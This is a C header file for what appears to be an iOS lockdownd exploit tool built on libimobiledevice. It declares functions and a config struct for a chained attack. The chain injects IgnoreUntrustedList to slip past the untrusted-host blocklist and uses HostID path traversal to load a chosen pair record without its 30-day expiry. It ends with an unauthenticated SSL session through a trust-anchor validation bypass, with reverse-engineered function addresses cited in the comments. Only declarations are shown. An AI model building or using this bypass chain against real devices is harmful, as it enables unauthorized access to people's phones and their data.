#ifndef L0FCK_LOCKDOWN_SSL_BYPASS_H
#define L0FCK_LOCKDOWN_SSL_BYPASS_H

#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <plist/plist.h>
#include <stdbool.h>

typedef struct {
    char target_plist_path[256];
    char custom_ca_cert[4096];
    char custom_client_cert[4096];
    char custom_client_key[4096];
    bool bypass_untrusted_list;
    bool traversal_active;
} lockdown_ssl_bypass_config_t;

/**
 * Sends IsHostTrusted request with IgnoreUntrustedList=true option dictionary,
 * bypassing the untrusted host blocklist check (sub_100019ca8).
 */
int lockdown_bypass_is_host_trusted(lockdownd_client_t client, bool *is_trusted);

/**
 * Issues StartSession request using path traversal HostID prefix (sub_100016160)
 * to load a target pair record without prefix '..' restriction, bypassing
 * 30-day expiry (sub_10001f8c8 / sub_100003f0c).
 */
int lockdown_bypass_start_session_traversal(lockdownd_client_t client, const char *traversal_host_id);

/**
 * Complete unauthenticated SSL session establishment combining:
 * 1. IgnoreUntrustedList injection
 * 2. HostID path traversal to controlled/expiry-free pair record
 * 3. Custom SSL trust-anchor validation bypass (sub_1000ac4f8)
 */
int lockdown_bypass_establish_unauthenticated_session(lockdownd_client_t client);

/**
 * Test and diagnose the lockdownd unauthenticated ACL and SSL bypass primitives.
 */
int lockdown_bypass_test(lockdownd_client_t client);

#endif /* L0FCK_LOCKDOWN_SSL_BYPASS_H */
